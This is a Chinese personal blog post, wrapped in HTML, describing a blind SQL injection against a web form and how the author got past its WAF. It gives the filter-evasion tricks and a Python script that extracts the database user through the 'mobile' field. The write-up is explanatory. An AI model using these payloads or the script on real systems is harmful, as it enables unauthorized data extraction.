@@ -1,0 +1,84 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Eason"><title>记一次注入bypass · Eason 的博客</title><meta name="description" content="首先拿到了一处注入点手工测试一下这就被拦了吗…
+测了几下
+Select被拦
+逗号被过滤
+显错不是很顺手，开始盲注
+首先是or 1=1
+~~两次取反可以绕过
+
+尝试length获取datatbase长度
+
+这。。。database变成databa&amp;lt;x&gt;se了而且&amp;lt;&amp;gt;也被实体编码了，所"><meta name="keywords" content="Linux"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Eason 的博客</a></h3></div></div><ul class="social-links"><li><a href="http://github.com/ea5on"><i class="fa fa-github"></i></a></li></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/links">友链</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>记一次注入bypass</a></h3></div><div class="post-content"><p>首先拿到了一处注入点<br><img src="https://i.imgur.com/1X3wict.png" alt=""><br>手工测试一下<br><img src="https://i.imgur.com/iJrTNfx.png" alt=""><br>这就被拦了吗…</p>
+<p>测了几下</p>
+<p>Select被拦</p>
+<p>逗号被过滤</p>
+<p>显错不是很顺手，开始盲注</p>
+<p>首先是or 1=1</p>
+<p><strong>~~两次取反可以绕过</strong></p>
+<p><img src="https://i.imgur.com/3f0EYHm.png" alt=""></p>
+<p><strong>尝试length获取datatbase长度</strong></p>
+<p><img src="https://i.imgur.com/gKWWnpE.png" alt=""></p>
+<p>这。。。database变成databa&lt;x>se了<br>而且&lt;&gt;也被实体编码了，所以盲注只能用=<br>这时候想到过滤的逗号，能不能<strong>利用waf绕过waf呢</strong></p>
+<p><img src="https://i.imgur.com/SKutX1Z.png" alt=""><br>没用,好吧,试试别的函数</p>
+<blockquote>
+<p>system_user() 系统用户名</p>
+</blockquote>
+<blockquote>
+<p>user() 用户名</p>
+</blockquote>
+<blockquote>
+<p>current_user 当前用户名</p>
+</blockquote>
+<blockquote>
+<p>session_user()连接数据库的用户名</p>
+</blockquote>
+<blockquote>
+<p>database() 数据库名</p>
+</blockquote>
+<blockquote>
+<p>version() MYSQL数据库版本</p>
+</blockquote>
+<blockquote>
+<p>load_file() MYSQL读取本地文件的函数</p>
+</blockquote>
+<blockquote>
+<p>@@datadir 读取数据库路径</p>
+</blockquote>
+<blockquote>
+<p>@@basedir MYSQL 安装路径</p>
+</blockquote>
+<blockquote>
+<p>@@version_compile_os 操作系统 Windows Server 2003</p>
+</blockquote>
+<p>current_user长度为13<br><img src="https://i.imgur.com/oExqDMO.jpg" alt=""></p>
+<p>出数据的话left要用逗号</p>
+<p>Substring可以不使用逗号（mid 也可以，当时只查到了substring）</p>
+<p><img src="https://i.imgur.com/pMs41uP.png" alt=""></p>
+<p><img src="https://i.imgur.com/OY7KQWR.png" alt=""><br>substr被拦</p>
+<p>这个时候尝试了好久，突然想到databse()是变而不是拦，那逗号会不会可以用呢</p>
+<p><img src="https://i.imgur.com/LBlKcLt.png" alt=""></p>
+<p>本以为可以愉快地出数据了结果=’a’又被拦了，貌似=后面不能接字符，ascii伺候</p>
+<p><img src="https://i.imgur.com/eyDRkab.png" alt=""><br>Ascii也被拦了没关系，吃我逗号！</p>
+<p><img src="https://i.imgur.com/KEGv4ki.png" alt=""><br>看到502吓我一跳，后来发现真的时候是502，假的时候200</p>
+<p>Fuzz脚本</p>
+<p>import requests<br>url=’<a href="https://xxxxxxxxxxxxxxxxxxxxxxxxxxx&#39;" target="_blank" rel="noopener">https://xxxxxxxxxxxxxxxxxxxxxxxxxxx&#39;</a></p>
+<pre><code>for i in range(1,14):
+    for j in range(1,127):
+        payload=&quot;1 or~~asc,ii(mid(current_user from %s for 1))=%s#&quot;%(i,j)
+        data={&apos;captcha&apos;:&apos;1&apos;,
+                &apos;getSmsVerfy&apos;:&apos;111111&apos;,
+                &apos;mobile&apos;:payload}
+        g=requests.post(url,data=data)
+        if g.status_code==502:
+            print j
+</code></pre><p><img src="https://i.imgur.com/mdVQ2yQ.png" alt=""></p>
+</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2018-12-03</span><i class="fa fa-tag"></i><a class="tag" href="/categories/渗透测试/" title="渗透测试">渗透测试 </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://yoursite.com/2018/12/03/记一次注入bypass/,Eason 的博客,记一次注入bypass,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/2018/11/25/记一次应急/" title="记一次应急">下一篇</a></li></ul></div><a id="comments"></a><div id="vcomments" style="margin:0 30px;"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js?v=undefined"></script><script>var valine = new Valine({
+  el:'#vcomments',
+  notify:false || false, 
+  verify:false|| false, 
+  app_id:'Y1t5hlpXQHfpWpR7qtyaT351-gzGzoHsz',
+  app_key:'yvrtethd8B3Lk7q2O9XjIYbS',
+  placeholder:'讨论一下?',
+  path: window.location.pathname,
+  avatar:'mm'
+})</script></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
